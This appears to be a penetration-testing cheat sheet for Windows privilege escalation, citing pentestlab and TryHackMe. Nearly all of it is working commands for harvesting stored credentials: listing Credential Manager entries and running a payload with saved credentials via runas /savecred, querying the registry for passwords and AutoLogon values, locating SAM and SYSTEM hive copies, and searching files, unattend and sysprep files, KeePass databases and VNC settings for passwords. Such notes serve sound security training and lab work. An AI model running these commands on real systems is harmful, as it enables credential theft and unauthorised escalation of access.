# Exposed Windows Credential 


## Credential Manager

If there are entries, it means that we may able to runas certain user who stored his cred in windows
```powershell
powershell cmdkey /list 
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```

Use the credentail to run payload:

    runas /savecred /user:USER C:\payload.exe


## Search for password in registry  

Reg key with the string `password`:
```powershell
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s  
```
## AutoLogon
```powershell
reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr "DefaultUserName DefaultDomainName DefaultPassword"  
```
## Password in files  

Can we find any SAM files?  
```powershell
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\repair\system 
```
```powershell
%SYSTEMROOT%\System32\config\SAM  
%SYSTEMROOT%\System32\config\SYSTEM
```
```powershell
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\RegBack\system  
```
findstr Extentions 
```powershell
findstr /si password *.txt  
findstr /si password *.xml  
findstr /si password *.ini  
findstr /si pass/pwd *.ini  
findstr /si pass/pwd *.conf 
```
```
dir /s *pass* == *cred* == *vnc* == *.config*  
```
in all files  
```powershell
findstr /spin "password" *.*  
findstr /spin "password" *.*  
```
Unattended? vnc?  
```powershell
c:\sysprep.inf  
c:\sysprep\sysprep.xml  
c:\unattend.xml  
%WINDIR%\Panther\Unattend\Unattended.xml  
%WINDIR%\Panther\Unattended.xml  

dir /b /s unattend.xml  
dir /b /s web.config  
dir /b /s sysprep.inf  
dir /b /s sysprep.xml  
dir /b /s *pass*  
dir /b /s *.kdbx
```
> OR

```powershell
Get-Childitem -Recurse -ErrorAction SilentlyContinue -Include *.kdbx,*pass*,unattend.xml,web.config,sysprep.inf,sysprep.xml
```

vnc
```powershell
dir c:\*vnc.ini /s /b  
dir c:\*ultravnc.ini /s /b   
dir c:\ /s /b | findstr /si *vnc.ini  
```
## VNC  
```powershell
reg query "HKCU\Software\ORL\WinVNC3\Password"  
reg query "HKCU\Software\TightVNC\Server"  
```
# Source

- https://pentestlab.blog/tag/privilege-escalation/page/3/
- https://tryhackme.com/room/windows10priv